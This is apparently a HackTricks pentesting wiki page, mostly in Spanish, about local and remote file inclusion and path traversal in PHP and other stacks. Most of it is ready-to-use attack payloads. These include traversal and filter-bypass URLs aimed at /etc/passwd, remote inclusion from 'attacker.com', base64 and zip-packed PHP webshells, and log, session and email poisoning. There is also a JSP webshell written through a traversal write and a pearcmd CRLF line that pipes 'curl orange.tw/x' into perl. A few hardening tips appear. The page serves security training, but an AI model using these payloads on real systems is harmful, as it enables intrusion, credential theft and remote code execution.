# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** El archivo se carga desde un servidor remoto (Mejor: Puedes escribir el código y el servidor lo ejecutará). En php esto está **deshabilitado** por defecto (**allow_url_include**).\
**Local File Inclusion (LFI):** El servidor carga un archivo local.

La vulnerabilidad ocurre cuando el usuario puede controlar de alguna manera el archivo que va a ser cargado por el servidor.

Funciones **PHP** vulnerables: require, require_once, include, include_once

Una herramienta interesante para explotar esta vulnerabilidad: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mezclando varias listas LFI de \*nix y añadiendo más rutas he creado esta:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Try also to change `/` for `\`\
Try also to add `../../../../../`

Una lista que utiliza varias técnicas para encontrar el archivo /etc/password (para comprobar si existe la vulnerabilidad) se puede encontrar [aquí](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Fusión de diferentes wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Try also to change `/` for `\`\
Try also to remove `C:/` and add `../../../../../`

Una lista que utiliza varias técnicas para encontrar el archivo /boot.ini (para comprobar si existe la vulnerabilidad) se puede encontrar [aquí](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Consulta la lista LFI de linux.

## Básico LFI y bypasses

Todos los ejemplos son para Local File Inclusion pero también podrían aplicarse a Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences eliminadas de forma no recursiva
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass para evitar la adición de más caracteres al final de la cadena proporcionada (bypass de: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Esto está **resuelto desde PHP 5.4**

### **Codificación**

Puedes usar codificaciones no estándar como double URL encode (y otras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Desde una carpeta existente

Quizás el back-end esté comprobando la ruta de la carpeta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Explorando directorios del sistema de archivos en un servidor

El sistema de archivos de un servidor puede explorarse de forma recursiva para identificar directorios, no solo archivos, empleando ciertas técnicas. Este proceso implica determinar la profundidad del directorio y sondear la existencia de carpetas específicas. A continuación se muestra un método detallado para lograrlo:

1. **Determinar la profundidad del directorio:** Determina la profundidad de tu directorio actual obteniendo con éxito el archivo `/etc/passwd` (aplicable si el servidor es Linux). Una URL de ejemplo podría estructurarse de la siguiente manera, indicando una profundidad de tres:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probar carpetas:** Añade el nombre de la carpeta sospechosa (p. ej., `private`) a la URL, luego vuelve a `/etc/passwd`. El nivel de directorio adicional requiere incrementar la profundidad en uno:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretar los resultados:** La respuesta del servidor indica si la carpeta existe:
- **Error / Sin salida:** Es probable que la carpeta `private` no exista en la ubicación especificada.
- **Contenido de `/etc/passwd`:** Se confirma la presencia de la carpeta `private`.
4. **Exploración recursiva:** Las carpetas descubiertas pueden explorarse más a fondo para buscar subdirectorios o archivos usando la misma técnica o los métodos tradicionales de Local File Inclusion (LFI).

Para explorar directorios en distintas ubicaciones del sistema de archivos, ajusta el payload en consecuencia. Por ejemplo, para comprobar si `/var/www/` contiene un directorio `private` (asumiendo que el directorio actual está a una profundidad de 3), usa:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation es un método empleado para manipular rutas de archivos en aplicaciones web. A menudo se utiliza para acceder a archivos restringidos eludiendo ciertas medidas de seguridad que añaden caracteres adicionales al final de las rutas de archivos. El objetivo es crear una ruta de archivo que, una vez modificada por la medida de seguridad, siga apuntando al archivo deseado.

En PHP, varias representaciones de una ruta de archivo pueden considerarse equivalentes debido a la naturaleza del sistema de archivos. Por ejemplo:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` se tratan todas como la misma ruta.
- Cuando los últimos 6 caracteres son `passwd`, agregar un `/` (convirtiéndolo en `passwd/`) no cambia el archivo objetivo.
- De forma similar, si `.php` se añade a una ruta de archivo (como `shellcode.php`), agregar `/.` al final no alterará el archivo al que se accede.

Los ejemplos proporcionados demuestran cómo utilizar path truncation para acceder a `/etc/passwd`, un objetivo común debido a su contenido sensible (información de cuentas de usuario):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
En estos escenarios, el número de traversals necesarios podría ser alrededor de 2027, pero este número puede variar según la configuración del servidor.

- **Using Dot Segments and Additional Characters**: Las secuencias de traversal (`../`) combinadas con segmentos de punto adicionales y caracteres pueden usarse para navegar el sistema de archivos, ignorando efectivamente las cadenas añadidas por el servidor.
- **Determining the Required Number of Traversals**: Mediante prueba y error, se puede encontrar el número preciso de secuencias `../` necesarias para navegar hasta el directorio raíz y luego a `/etc/passwd`, asegurando que cualquier cadena añadida (como `.php`) sea neutralizada pero la ruta deseada (`/etc/passwd`) permanezca intacta.
- **Starting with a Fake Directory**: Es una práctica común comenzar la ruta con un directorio inexistente (como `a/`). Esta técnica se usa como medida de precaución o para cumplir los requisitos de la lógica de análisis de rutas del servidor.

Al emplear técnicas de truncado de ruta, es crucial comprender el comportamiento de análisis de rutas del servidor y la estructura del sistema de archivos. Cada escenario puede requerir un enfoque distinto, y a menudo es necesario probar para encontrar el método más efectivo.

**Esta vulnerabilidad fue corregida en PHP 5.3.**

### **Trucos para evadir filtros**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

En php esto está deshabilitado por defecto porque **`allow_url_include`** está **Off.** Debe estar **On** para que funcione, y en ese caso podrías incluir un archivo PHP desde tu server y obtener RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si por alguna razón **`allow_url_include`** está **On**, pero PHP está **filtering** el acceso a páginas web externas, [según este post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), podrías usar por ejemplo el data protocol con base64 para decodificar un b64 PHP code y egt RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> En el código anterior, el `+.txt` final se añadió porque el atacante necesitaba una cadena que terminara en `.txt`, así que la cadena acaba con eso y, tras el b64 decode, esa parte devolverá solo basura y el código PHP real será incluido (y, por lo tanto, ejecutado).
>
> Otro ejemplo que **no usa el protocolo `php://`** sería:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Elemento raíz en Python

En Python, en un código como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si el usuario pasa una **ruta absoluta** a **`file_name`**, la **ruta anterior simplemente se elimina**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Este es el comportamiento previsto según [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Si un componente es una ruta absoluta, todos los componentes anteriores se descartan y la concatenación continúa desde el componente de ruta absoluta.

## Java Listar directorios

Parece que si tienes un Path Traversal en Java y **pides un directorio** en lugar de un archivo, se devuelve **el listado del directorio**. Esto no ocurre en otros lenguajes (que yo sepa).

## Top 25 parámetros

Aquí tienes una lista de los 25 parámetros principales que podrían ser vulnerables a local file inclusion (LFI) (de [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filters allow perform basic **modification operations on the data** before being it's read or written. There are 5 categories of filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Remove tags from the data (everything between "<" and ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . To get the **list of all the encodings** supported run in the console: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Compress the content (useful if exfiltrating a lot of info)
- `zlib.inflate`: Decompress the data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecado
- `mdecrypt.*` : Deprecado
- Other Filters
- Ejecutando en php `var_dump(stream_get_filters());` puedes encontrar un par de **filtros inesperados**:
- `consumed`
- `dechunk`: revierte la codificación chunked de HTTP
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> La parte "php://filter" no distingue entre mayúsculas y minúsculas

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) se propone una técnica para leer un archivo local sin que el servidor devuelva directamente el contenido. Esta técnica se basa en una **exfiltración booleana del archivo (carácter por carácter) usando php filters** como oracle. Esto es porque los php filters pueden usarse para hacer que un texto sea lo suficientemente grande como para que php lance una excepción.

En el post original puedes encontrar una explicación detallada de la técnica, pero aquí tienes un resumen rápido:

- Usa el codec **`UCS-4LE`** para dejar el carácter inicial del texto al principio y hacer que el tamaño de la cadena aumente exponencialmente.
- Esto se usará para generar un **texto tan grande que, cuando la letra inicial se adivina correctamente**, php disparará un **error**.
- El filtro **dechunk** **eliminará todo si el primer char no es un hexadecimal**, por lo que podemos saber si el primer char es hex.
- Esto, combinado con lo anterior (y otros filters dependiendo de la letra adivinada), nos permitirá adivinar una letra al principio del texto viendo cuándo realizamos suficientes transformaciones como para que deje de ser un carácter hexadecimal. Porque si es hex, dechunk no lo eliminará y la bomba inicial provocará el error de php.
- El codec **convert.iconv.UNICODE.CP930** transforma cada letra en la siguiente (por ejemplo: a -> b). Esto permite descubrir si la primera letra es una `a` porque si aplicamos 6 de estos codec a->b->c->d->e->f->g la letra deja de ser un carácter hexadecimal; por lo tanto dechunk no la elimina y se produce el error de php porque se multiplica con la bomba inicial.
- Usando otras transformaciones como **rot13** al principio es posible leak otros chars como n, o, p, q, r (y otros codecs pueden usarse para mover otras letras al rango hex).
- Cuando el carácter inicial es un número es necesario codificarlo en base64 y leak las 2 primeras letras para filtrar el número.
- El problema final es ver **cómo leak más que la letra inicial**. Al usar filters de orden de memoria como **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** es posible cambiar el orden de los chars y situar en la primera posición otras letras del texto.
- Y para poder obtener **datos adicionales** la idea es **generar 2 bytes de basura al principio** con **convert.iconv.UTF16.UTF16**, aplicar **UCS-4LE** para que **gire con los siguientes 2 bytes**, y **eliminar los datos hasta la basura** (esto eliminará los primeros 2 bytes del texto inicial). Repetir hasta alcanzar el bit deseado para leak.

En el post también fue leaked una herramienta para automatizar esto: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
También puedes usar **php://stdin, php://stdout y php://stderr** para acceder a los **descriptores de archivo 0, 1 y 2** respectivamente (no estoy seguro de cómo podría ser útil esto en un ataque)

### zip:// y rar://

Sube un archivo Zip o Rar con un PHPShell dentro y accede a él.\
Para poder abusar del protocolo rar, **debe activarse específicamente**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Tenga en cuenta que este protocolo está restringido por las configuraciones de php **`allow_url_open`** y **`allow_url_include`**

### expect://

Expect debe estar activado. Puedes ejecutar código usando esto:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifica tu payload en los parámetros POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Un archivo `.phar` puede utilizarse para ejecutar código PHP cuando una aplicación web emplea funciones como `include` para la carga de archivos. El fragmento de código PHP que se muestra a continuación demuestra la creación de un archivo `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Para compilar el archivo `.phar`, debe ejecutarse el siguiente comando:
```bash
php --define phar.readonly=0 create_path.php
```
Al ejecutarse, se creará un archivo llamado `test.phar`, que podría aprovecharse para explotar vulnerabilidades de Local File Inclusion (LFI).

En casos donde la LFI solo realiza lectura de archivos sin ejecutar el código PHP interno, a través de funciones como `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` o `filesize()`, se podría intentar explotar una vulnerabilidad de deserialización. Esta vulnerabilidad está asociada con la lectura de archivos usando el protocolo `phar`.

Para una comprensión detallada de cómo explotar vulnerabilidades de deserialización en el contexto de archivos `.phar`, consulte el documento enlazado a continuación:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Se pudo abusar de **any arbitrary file read from PHP that supports php filters** para obtener RCE. La descripción detallada puede [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Resumen muy rápido: un **3 byte overflow** en el heap de PHP fue explotado para **alter the chain of free chunks** de un tamaño específico con el fin de poder **write anything in any address**, por lo que se añadió un hook para llamar a **`system`**.\
Fue posible alloc chunks de tamaños específicos abusando de más php filters.

### More protocols

Consulte más posibles [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Escribe en memoria o en un archivo temporal (no estoy seguro de cómo esto puede ser útil en un file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Acceso al sistema de archivos local
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Acceso a URLs HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Acceso a FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Streams de compresión
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (No devuelve nada imprimible, así que no es realmente útil aquí)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Streams de audio (No útil para leer archivos arbitrarios)

## LFI vía 'assert' de PHP

Los riesgos de Local File Inclusion (LFI) en PHP son notablemente altos cuando se trata de la función 'assert', que puede ejecutar código contenido en cadenas. Esto es especialmente problemático si se comprueba la entrada que contiene caracteres de directory traversal como ".." pero no se sanitiza correctamente.

Por ejemplo, el código PHP podría estar diseñado para prevenir directory traversal de la siguiente manera:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Aunque esto pretende detener traversal, inadvertidamente crea un vector para code injection. Para aprovechar esto y leer el contenido de archivos, un attacker podría usar:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
De forma similar, para ejecutar comandos arbitrarios del sistema, se podría usar:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Esta técnica es relevante en casos en que tú **controlas** la **ruta del archivo** de una **función PHP** que va a **acceder a un archivo** pero no verás el contenido del archivo (como una llamada simple a **`file()`**) ya que el contenido no se muestra.

En [**esta increíble publicación**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) se explica cómo un blind path traversal puede ser abusado mediante filtros de PHP para **exfiltrate the content of a file via an error oracle**.

En resumen, la técnica usa la codificación **"UCS-4LE"** para hacer que el contenido de un archivo sea tan **grande** que la **función PHP que abre** el archivo desencadene un **error**.

Luego, para leak the first char se utiliza el filtro `dechunk` junto con otros como `base64` o `rot13`, y finalmente los filtros `convert.iconv.UCS-4.UCS-4LE` y `convert.iconv.UTF16.UTF-16BE` se usan para colocar otros chars al principio and leak them.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

For the technical details check the mentioned post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

When server-side code that ingests/uploads files builds the destination path using user-controlled data (e.g., a filename or URL) without canonicalising and validating it, `..` segments and absolute paths can escape the intended directory and cause an arbitrary file write. If you can place the payload under a web-exposed directory, you usually get unauthenticated RCE by dropping a webshell.

Typical exploitation workflow:
- Identify a write primitive in an endpoint or background worker that accepts a path/filename and writes content to disk (e.g., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Common examples:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Craft a traversal path that breaks out of the intended storage directory into the webroot, and include your webshell content.
- Browse to the dropped payload and execute commands.

Notes:
- The vulnerable service that performs the write may listen on a non-HTTP port (e.g., a JMF XML listener on TCP 4004). The main web portal (different port) will later serve your payload.
- On Java stacks, these file writes are often implemented with simple `File`/`Paths` concatenation. Lack of canonicalisation/allow-listing is the core flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Hardening que derrota esta clase de bugs:
- Resuelve la ruta a su forma canónica y verifica que sea descendiente de un directorio base en la lista de permitidos.
- Rechaza cualquier ruta que contenga `..`, raíces absolutas o letras de unidad; prefiere nombres de archivo generados.
- Ejecuta el proceso que escribe como una cuenta de bajos privilegios y separa los directorios de escritura de los directorios servidos.

## Remote File Inclusion

Explicado previamente, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Si el servidor Apache o Nginx es **vulnerable a LFI** dentro de la función include, podrías intentar acceder a **`/var/log/apache2/access.log` o `/var/log/nginx/access.log`**, colocar en el **user agent** o en un **GET parameter** un php shell como **`<?php system($_GET['c']); ?>`** e incluir ese archivo

> [!WARNING]
> Ten en cuenta que **si usas comillas dobles** para el shell en lugar de **comillas simples**, las comillas dobles serán modificadas por la cadena "_**quote;**_", **PHP lanzará un error** y **nada más se ejecutará**.
>
> Además, asegúrate de **escribir correctamente el payload** o PHP dará error cada vez que intente cargar el archivo de logs y no tendrás una segunda oportunidad.

Esto también puede hacerse en otros logs pero **ten cuidado,** el código dentro de los logs podría estar URL encoded y esto podría destruir el Shell. La cabecera **authorisation "basic"** contiene "user:password" en Base64 y se decodifica dentro de los logs. El PHPShell podría ser insertado dentro de esta cabecera.\
Otros posibles archivos de log:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Vía correo electrónico

**Envía un correo** a una cuenta interna (user@localhost) que contenga tu payload PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e intenta incluir el correo del usuario con una ruta como **`/var/mail/<USERNAME>`** o **`/var/spool/mail/<USERNAME>`**

### Vía /proc/*/fd/*

1. Sube muchos shells (por ejemplo: 100)
2. Incluye [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), con $PID = PID del proceso (puede obtenerse por fuerza bruta) y $FD el file descriptor (también puede obtenerse por fuerza bruta)

### Vía /proc/self/environ

Como con un archivo de logs, envía el payload en el User-Agent; se reflejará dentro del archivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Mediante upload

Si puedes subir un archivo, simplemente inyecta el payload de shell en él (p. ej.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para mantener el archivo legible, es mejor inyectarlo en los metadatos de las imágenes/doc/pdf

### Mediante carga de archivo ZIP

Sube un archivo ZIP que contenga un PHP shell comprimido y accede:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### A través de PHP sessions

Comprueba si el sitio web utiliza PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, estas sesiones se almacenan en los archivos _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Establece la cookie a `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Usa el LFI para incluir el archivo de sesión de PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Vía ssh

Si ssh está activo, verifica qué usuario se está usando (/proc/self/status & /etc/passwd) y trata de acceder a **\<HOME>/.ssh/id_rsa**

### **Vía** **vsftpd** _**registros**_

Los registros del servidor FTP vsftpd se encuentran en _**/var/log/vsftpd.log**_. En el caso de que exista una vulnerabilidad de Local File Inclusion (LFI), y sea posible acceder a un servidor vsftpd expuesto, se pueden considerar los siguientes pasos:

1. Inyecta un payload PHP en el campo de nombre de usuario durante el proceso de inicio de sesión.
2. Tras la inyección, utiliza la LFI para recuperar los registros del servidor desde _**/var/log/vsftpd.log**_.

### Vía php base64 filter (usando base64)

Como se muestra en [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artículo, el filtro PHP base64 simplemente ignora los caracteres no base64. Puedes usar eso para eludir la verificación de la extensión de archivo: si suministras un base64 que termine con ".php", éste simplemente ignorará el "." y añadirá "php" al base64. Aquí hay un ejemplo de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Vía php filters (no file needed)

Este [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que puedes usar **php filters para generar contenido arbitrario** como salida. Lo que básicamente significa que puedes **generar código php arbitrario** para el include **sin necesidad de escribirlo** en un archivo.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Vía segmentation fault

**Sube** un archivo que será almacenado como **temporal** en `/tmp`, luego en la **misma petición,** provoca un **segmentation fault**, y entonces el **archivo temporal no será eliminado** y podrás buscarlo.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Vía Nginx almacenamiento de archivos temporales

Si encontraste una Local File Inclusion y Nginx está ejecutándose delante de PHP, podrías obtener RCE con la siguiente técnica:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Vía PHP_SESSION_UPLOAD_PROGRESS

Si encontraste una Local File Inclusion incluso si no tienes una sesión y `session.auto_start` está `Off`. Si proporcionas el **`PHP_SESSION_UPLOAD_PROGRESS`** en datos multipart POST, PHP habilitará la sesión por ti. Podrías abusar de esto para obtener RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Vía cargas de archivos temporales en Windows

Si encontraste una Local File Inclusion y el servidor está ejecutándose en **Windows** podrías obtener RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Vía `pearcmd.php` + URL args

Como se explica en este post, el script `/usr/local/lib/phppearcmd.php` existe por defecto en las imágenes docker de PHP. Además, es posible pasar argumentos al script vía la URL porque se indica que si un parámetro de la URL no tiene un `=`, debería usarse como argumento. Véase también el write-up de watchTowr y “Confusion Attacks” de Orange Tsai.

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Lo siguiente abusa de una CRLF vuln para obtener RCE (desde [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
